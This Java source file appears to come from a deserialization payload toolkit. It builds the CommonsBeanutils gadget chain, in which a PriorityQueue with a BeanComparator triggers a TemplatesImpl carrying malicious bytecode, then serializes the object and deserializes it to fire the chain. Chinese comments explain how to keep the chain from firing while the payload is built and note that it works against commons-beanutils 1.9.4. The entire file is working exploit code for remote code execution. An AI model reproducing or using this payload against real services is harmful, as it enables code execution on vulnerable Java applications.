package com.Jasetol.payloads;

import com.Jasetol.utils.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.util.PriorityQueue;

/*
 * Gadget:
 *   PriorityQueue#readObject
 *     BeanComparator#compare
 *       TemplatesImpl#getOutputProperties
 *         TemplatesImpl#newTransformer
 * 1. 这条链依赖的是 commons-beanutils ,在 1.9.4 版本亦可使用
 * */
public class CommonsBeanutils {

    public static Object getObject() throws Exception{
        // 创建恶意 TemplatesImpl 对象,_bytecodes 属性装载着恶意字节码
        TemplatesImpl templatesImpl = CreateTemplatesImpl.createTemplatesImpl();
        // 创建比较器
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue priorityQueue = new PriorityQueue(2,beanComparator);
        // 先用 add 添加元素,否则后面对 queue[] 数组的操作无法把真正的元素添加到 priorityQueue 中
        priorityQueue.add("1");
        priorityQueue.add("1");
        // 反射获取 queue[] 数组
        Object[] queue = (Object[]) Reflect.reflectGetField(priorityQueue, "queue");
        queue[0] = templatesImpl;
        queue[1] = "ky0116";
        // 最后反射对字段进行赋值,防止在构造payload时触发Gadget
        Reflect.reflectSetField(beanComparator,"property","outputProperties");
        return priorityQueue;
    }

    public static void main(String[] args) throws Exception{
        ParseArgs.parseArgs(args);
        PriorityQueue priorityQueue = (PriorityQueue) getObject();
        byte[] bytes = SerWithUnSer.serialize(priorityQueue);
        SerWithUnSer.unSerialize(bytes);
    }
}
